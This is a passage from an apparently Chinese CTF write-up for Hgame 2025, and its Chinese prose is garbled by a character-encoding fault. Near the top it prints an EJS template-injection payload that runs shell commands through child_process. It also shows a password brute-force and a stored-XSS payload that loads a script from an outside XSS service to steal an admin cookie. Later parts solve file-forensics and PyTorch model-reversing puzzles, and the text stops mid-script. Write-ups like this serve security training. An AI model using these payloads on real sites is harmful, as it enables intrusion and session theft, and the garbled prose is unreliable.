<code>/app/view/</code>ï¼Œåˆ·æ–°ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤å¾—åˆ°è¿”å›ï¼Œä½†æ²¡æœ‰æ‰¾åˆ° flagã€‚</p><p>è¿™é‡Œæ‰¾äº†å¥½ä¸€ä¼šï¼Œæœ€ååœ¨ç¯å¢ƒå˜é‡é‡Œç»ˆäºæ‰¾åˆ°äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%= <br>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> execSync = process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execSync</span>;<br>  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">const</span> procCmdline = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;cat /proc/1/cmdline&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`ç¯å¢ƒå˜é‡:\n<span class="hljs-subst">$&#123;env&#125;</span>\n\nè¿›ç¨‹å‚æ•°:\n<span class="hljs-subst">$&#123;procCmdline&#125;</span>`</span>;<br>&#125;)()<br> %&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025WP/NmUCbDUgtotJtIx6TC1cN1nEnP1.png"></p><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p><img src="/img/Hgame2025WP/C60ObFUJhoAtywx3H3ucTSQKncd.png"></p><p>å…ˆç™»å½•ï¼Œç”¨æˆ·ååº”è¯¥æ˜¯ shallotï¼Œå°è¯•ç”¨ BP çˆ†ç ´ï¼Œçˆ†å‡ºå¯†ç  888888</p><p><img src="/img/Hgame2025WP/IAhcbF5lLoY3QTxLPW0czp0Bnl7.png"></p><p>éšåè¿›å…¥ç•™è¨€æ¿ï¼Œæäº¤ <code>&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code> å‡ºç°å¼¹çª—ï¼Œä¼¼ä¹æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥æ•´å­˜å‚¨å‹ XSSï¼Œå»è·å– admin çš„ cookieã€‚æ‰€ä»¥æ‹¿ XSS ç½‘ç«™çš„ payload <code>&lt;sCRiPt sRC=//xs.pe/0c9&gt;&lt;/sCrIpT&gt;</code> ç›‘å¬å³å¯ã€‚</p><p><img src="/img/Hgame2025WP/Bi4bbrUHIoxldRx2Yf4cuzeKnpd.png"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºè¿™å¥â€œadmin æ‰ä¸ä¼šæ¥çœ‹ä½ â€æ˜¯åè¯ï¼Œæ˜¯ç»™çš„æç¤ºï¼Œåæ¥å‘ç°è¿˜çœŸæ²¡æ¥ï¼Œè¢«è‡ªå·±æ— è¯­åˆ°äº†â€¦â€¦</p><p>ç„¶åçªç„¶æƒ³èµ·æ¥å¿˜è®°ç›®å½•æ‰«æäº†ï¼Œä¸€æ‰«æ‰«å‡ºæ¥ä¸€ä¸ª <code>/admin</code></p><p><code>å¥½å§å¥½å§ä½ éƒ½è¿™ä¹ˆæ±‚æˆ‘äº†ï½adminåªå¥½å‹‰ä¸ºå…¶éš¾çš„æ¥çœ‹çœ‹ä½ å†™äº†ä»€ä¹ˆï½æ‰ä¸æ˜¯äººå®¶æƒ³çœ‹å‘¢ï¼</code></p><p>â€¦â€¦æˆ‘æƒ³è¿™åº”è¯¥è¡Œäº†ï¼Œç„¶è€Œä¸çŸ¥é“ä»€ä¹ˆåŸå› è¿˜æ˜¯æ²¡æœ‰æ”¶è·ã€‚</p><p>åæ¥é¢˜ç›®åˆæä¾›äº†éƒ¨åˆ†æºç ï¼Œå‘ç°æ€è·¯åº”è¯¥æ˜¯å¯¹çš„ï¼Œé‡æ–°è¯•äº†ä¸€éï¼Œè¿™å›æˆäº†ï¼Œå¾—åˆ° admin çš„ cookieï¼Œè®¿é—® <code>/flag</code> ç”¨ BP ä¿®æ”¹ cookie ä¸º admin çš„ï¼Œå¾—åˆ° flag</p><p><img src="/img/Hgame2025WP/QYIlbVcTwoXNRAxaGRgcs3pvn0b.png"></p><p><img src="/img/Hgame2025WP/FT01b9hU0oVaCMxpuIycHxFcnZc.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><p>é™„ä»¶ hky.txt å…¨æ˜¯ 16 è¿›åˆ¶çš„æ–‡æœ¬ï¼Œå¼€å¤´ <code>50 4B 03 04</code> zip çš„æ–‡ä»¶å¤´ï¼Œå¯»æ‰¾æ–‡ä»¶å°¾å‘ç° <code>50 4B 05 06 00 00 00 00 02 00 02 00 C1 00 00 00 9D 00 00 00 00 00</code>ï¼Œåé¢è¿˜æœ‰ä¸€é•¿ä¸²çš„å†—ä½™ä¼°è®¡æœ‰å…¶ä»–ä¿¡æ¯éšè—åœ¨å†—ä½™éƒ¨åˆ†ã€‚å†—ä½™éƒ¨åˆ†å¼€å¤´ <code>82 60 42 AE</code>ï¼Œç»“å°¾ <code>47 4E 50 89</code>ï¼Œæ¨æµ‹åº”è¯¥æ˜¯æŠŠ png å›¾ç‰‡çš„ç¼–ç ä»¥ä¸€ä¸ª 16 è¿›åˆ¶ä¸ºå•ä½å€’è½¬é¡ºåºäº†ï¼Œæ­£å¸¸ png æ–‡ä»¶å¤´ <code>89 50 4E 47</code>ï¼Œç»“å°¾ <code>AE 42 60 82</code>ã€‚</p><p>æ‰€ä»¥å°†ä¸¤éƒ¨åˆ†æ–‡æœ¬åˆ†å¼€ï¼Œå‰éƒ¨åˆ†å†™ä¸ª python è½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜ä¸º zip åç¼€å³å¯æ­£å¸¸æ‰“å¼€ï¼Œé‡Œé¢æœ‰å¯†ç åŠ å¯†ã€‚</p><p>åé¢éƒ¨åˆ†å…ˆå†™ä¸ª python æŠŠ 16 è¿›åˆ¶æ•°çš„é¡ºåºåè½¬ï¼Œå†ç”¨ä¸Šé¢çš„åŒä¸€ä¸ªç¨‹åºè½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜ä¸º png åç¼€å³å¯ã€‚</p><p>ç„¶è€Œå›¾ç‰‡ä¸­æœªæ‰¾åˆ°å¯†ç ï¼Œæ¨æµ‹æ–‡ä»¶å®½é«˜è¢«ä¿®æ”¹ï¼Œåˆ©ç”¨ crc æ ¡éªŒå¾—æ­£ç¡®å®½é«˜ <code>576 779</code>ï¼Œä¿®æ”¹è·å¾—éšè—çš„å¯†ç ã€‚è¿›å…¥å‹ç¼©åŒ…å¾— flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;new_hky1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == <span class="hljs-number">0xA672282D</span>):    <span class="hljs-comment">#å›¾ç‰‡å½“å‰CRC</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025WP/IBGJbM15ao7yAxxNaRicVpKBnwr.png"></p><h3 id="Level-314-çº¿æ€§èµ°å»Šä¸­çš„åŒç”Ÿå®ä½“"><a href="#Level-314-çº¿æ€§èµ°å»Šä¸­çš„åŒç”Ÿå®ä½“" class="headerlink" title="Level 314 çº¿æ€§èµ°å»Šä¸­çš„åŒç”Ÿå®ä½“"></a>Level 314 çº¿æ€§èµ°å»Šä¸­çš„åŒç”Ÿå®ä½“</h3><p>é™„ä»¶æä¾›äº†ä¸€ä¸ªç¥ç»ç½‘ç»œæ¨¡å— entity.pt æ–‡ä»¶ï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºåŠ è½½ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>)   <span class="hljs-comment">#åŠ è½½</span><br><span class="hljs-comment">#å‡†å¤‡ä¸€ä¸ªå½¢çŠ¶ä¸º[â–ˆï¼Œâ–ˆâ–ˆ]çš„å¼ é‡ï¼Œç¡®ä¿å…¶ç¬¦åˆâ€œâ–ˆ/â–ˆç¨³å®šæ€â€æ¡ä»¶ã€‚</span><br>output = entity(input_tensor)   <span class="hljs-comment">#å°†å¼ é‡è¾“å…¥å®ä½“ä»¥å°è¯•æ¿€æ´»ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p>å…ˆæ˜¯éšä¾¿å‡†å¤‡äº†ä¸€ä¸ªå¼ é‡ tensor([4,14])ï¼ŒæŠ¥é”™ï¼Œæ„è¯†åˆ°æç¤ºç»™çš„æ˜¯â€œå½¢çŠ¶â€ï¼Œç„¶åæäº†ä¸€ä¸ªå½¢çŠ¶[4,14]çš„å¼ é‡ï¼ŒæŠ¥é”™</p><p><code>RuntimeError: mat1 and mat2 shapes cannot be multiplied (4x14 and 10x10)</code>ï¼Œè¯´æ˜å†…éƒ¨æœ‰çŸ©é˜µä¹˜æ³•è¿ç®—ä¸”å¦ä¸€ä¸ªçŸ©é˜µå½¢çŠ¶ä¸º[10,10]ã€‚æ‰€ä»¥æ¢ä¸€ä¸ªå½¢çŠ¶[4,10]çš„å¼ é‡ï¼Œ<code>print(output)</code> å°±æœ‰æ­£å¸¸è¾“å‡ºäº†ï¼Œä½†ç”±äºä¸€å¼€å§‹æˆ‘æ˜¯ 0 åˆ° 1 çº¿æ€§å–å€¼ç»„æˆçš„å¼ é‡ï¼Œå‡å€¼å¾ˆå°ï¼Œæ‰€ä»¥æ²¡æœ‰çœ‹åˆ°ä»»ä½•æœ‰ç”¨ä¿¡æ¯ã€‚</p><p>ç´¢æ€§å¼€å§‹è°ƒè¯•ï¼Œåœ¨ <code>output = entity(input_tensor)</code> å¤„æ‰“æ–­ç‚¹ï¼ŒæŸ¥çœ‹ entity çš„ä¿¡æ¯ã€‚</p><p>é¡¶å±‚çš„ forward æ¨ç†éƒ¨åˆ†å¦‚ä¸‹ï¼Œ<code>linear1 -&gt; security -&gt; relu -&gt; linear2</code></p><p><img src="/img/Hgame2025WP/Q2KUbsSQ0oBWWCxX6g8cb4Qanaf.png"></p><p>linear1 å’Œ linear2 å‡æ˜¯ä½¿ç”¨ <code>torch.nn.functional.linear(input,weight,bias)</code> åšçº¿æ€§å˜æ¢ï¼Œ<code>output=input*weight+bias</code>ï¼Œåˆ†åˆ«ä½¿ç”¨äº†å½¢çŠ¶(10,10)çš„ weight å’Œ(10,)çš„ biasã€å½¢çŠ¶(1,10)çš„ weight å’Œ(1,)çš„ biasã€‚</p><p><img src="/img/Hgame2025WP/K3TFb1wkXofsMoxXJa4cAx5inQb.png"></p><p><img src="/img/Hgame2025WP/KgynblxjPo2ggnx96LccdhlanAh.png"></p><p>security çš„ forward éƒ¨åˆ†</p><p>å½“æ»¡è¶³ <code>torch.allclose(torch.mean(x0), torch.tensor(0.31415000000000004), rtol=1.0000000000000001e-05, atol=0.0001)</code> æ—¶ä¼šä» flag æ•°ç»„ä¸­é€å­—è¯»å–å¹¶ä¸ 85 å¼‚æˆ–ï¼Œæ‹¼æ¥è¾“å‡ºã€‚å…¶ä¸­ <code>torch.mean(x0)</code> ä¸ºå¯¹å¼ é‡å†…æ‰€æœ‰å€¼å–å¹³å‡ï¼ˆæœªæŒ‡å®šç»´åº¦ï¼‰ï¼Œ<code>torch.allclose(A,B,rtol,atol)</code> æ¯”è¾ƒ Aã€B ä¸¤ä¸ªå…ƒç´ æ˜¯å¦æ¥è¿‘ï¼Œ|A-B| &lt;&#x3D; atol+rtol*|B| åˆ™ä¸º trueã€‚æ‰€ä»¥ç»¼ä¸Šï¼Œè¦è·å¾— flagï¼Œå°±è¦ä½¿è¾“å…¥çš„å¼ é‡ x ç»è¿‡ linear1 å¤„ç†åå–å¹³å‡æåº¦æ¥è¿‘äº 0.31415ã€‚ï¼ˆä¼°è®¡è¿™é‡Œå°±æ˜¯é¢˜ç›®æš—ç¤ºçš„â€œå‘¨ç‡â€ã€å’Œâ€œåæ–¹å¢ƒç•Œâ€äº†å§ï¼ŒÏ€*10^-1ï¼‰</p><p>æ­¤å¤–å½“æ»¡è¶³ <code>torch.gt(torch.mean(x),0.5)</code> æ—¶ï¼Œä¹Ÿå°±æ˜¯å–å¹³å‡åå¤§äº 0.5 æ—¶æ‹¼æ¥ã€è¾“å‡º fake_flagã€‚ï¼ˆæ­¤å¤„çš„ bool()åº”è¯¥ä¸æ˜¯ python è‡ªå¸¦çš„ bool å‡½æ•°ï¼Œå¦‚æœæ˜¯çš„è¯é‚£ä¹ˆè¿™æ¡åˆ¤æ–­åº”è¯¥å§‹ç»ˆä¸º trueï¼Œä¹Ÿå°±ä¸ä¼šå‡ºç°æˆ‘ä¸€å¼€å§‹çš„æƒ…å†µäº†å§ï¼Œä¸€å¼€å§‹å–å€¼å¤ªå°ï¼Œåˆä¸æ¥è¿‘ 0.31415ï¼Œå°±ä»€ä¹ˆæœ‰ç”¨çš„éƒ½æ²¡ï¼‰</p><p><img src="/img/Hgame2025WP/MVEPbeJI4o7GCOxjYPScVyO3n3c.png"></p><p>åˆ†æå®Œæˆåå†™è„šæœ¬è·‘å‡ºæ­£ç¡®çš„å¼ é‡è¾“å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>target_mean = <span class="hljs-number">0.31415000000000004</span><br><br>weight = torch.tensor([<br>    [-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>, <span class="hljs-number">0.2425</span>, <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>, <span class="hljs-number">0.1849</span>,<br>               <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>             [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>              -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>             [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>               <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>             [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>               <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>             [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>               <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>             [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>               <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>             [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>               <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>             [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>               <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>             [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>              -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>             [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>              -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]<br>], dtype=torch.float32)<br><br>bias = torch.tensor([<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>          <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>], dtype=torch.float32)<br><br>out_features, in_features = weight.shape<br><br>mW = torch.mean(weight)<br><br>mB = torch.mean(bias)<br><br>c = (target_mean - mB) / (in_features * mW)<br><br>x = torch.full((<span class="hljs-number">1</span>, in_features), c, dtype=torch.float32)<br><br>x1 = torch.nn.functional.linear(x, weight, bias)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant input x:&quot;</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weight mean:&quot;</span>, mW.item(), <span class="hljs-string">&quot;  Bias mean:&quot;</span>, mB.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant c:&quot;</span>, c.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Linear layer output x1:&quot;</span>)<br><span class="hljs-built_in">print</span>(x1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mean of x1:&quot;</span>, torch.mean(x1).item())<br><br><span class="hljs-built_in">print</span>(torch.allclose(torch.mean(x1), torch.tensor(target_mean), rtol=<span class="hljs-number">1e-05</span>, atol=<span class="hljs-number">0.0001</span>))<br></code></pre></td></tr></table></figure><p>ç„¶è€Œè¿™é‡Œå¾—å‡ºæ¥çš„å¼ é‡ç†è®ºä¸Šåº”è¯¥æ˜¯å¯¹çš„ä½†è¾“å…¥åè¿˜æ˜¯é”™çš„ï¼Œæœªå‡ºç°é¢„æœŸ flagã€‚åˆæ”¹æ•°æ®è¯•äº†ä¸€ä¼šï¼Œæ„Ÿè§‰å¯èƒ½æ˜¯é¢˜ç›®æ‰€è°“çš„æ—¶é—´é”™ä½åŠ å¯†ï¼Œä¸­é—´è¿˜æœ‰ä¸€é“ç¨‹åºå¯¼è‡´äº† entity ä¸­ç»“æœçš„åç§»ï¼Œæ‰€ä»¥æœ€åå†³å®šä»¥ç†è®ºæ­£ç¡®çš„è¾“å…¥ä¸ºåŸºç¡€ï¼Œ0.01 çš„æ­¥é•¿ï¼Œæ­£è´Ÿ 0.60 éå†ä¸€éï¼ˆæ¯æ¬¡å˜åŒ–å¯¹åº” security éƒ¨åˆ†çš„å¹³å‡å€¼å˜åŒ–é‡ä¸º 0.0001ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> math<br><br>entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>))<br>entity.<span class="hljs-built_in">eval</span>()<br><br>weight1 = [[-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>,  <span class="hljs-number">0.2425</span>,  <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>,  <span class="hljs-number">0.1849</span>,<br>          <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>        [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>         -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>        [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>          <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>        [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>          <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>        [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>          <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>        [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>          <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>        [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>          <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>        [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>          <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>        [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>         -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>        [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>         -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]]<br>bias1 = [<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>         <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>]<br>torch_weight1 = torch.tensor(weight1, dtype=torch.float32)<br>torch_bias1   = torch.tensor(bias1, dtype=torch.float32)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">60</span>,<span class="hljs-number">60</span>):<br>    temp = <span class="hljs-number">378.3501922607422</span><br>    input_tensor = torch.tensor([[temp+i*<span class="hljs-number">0.01</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span 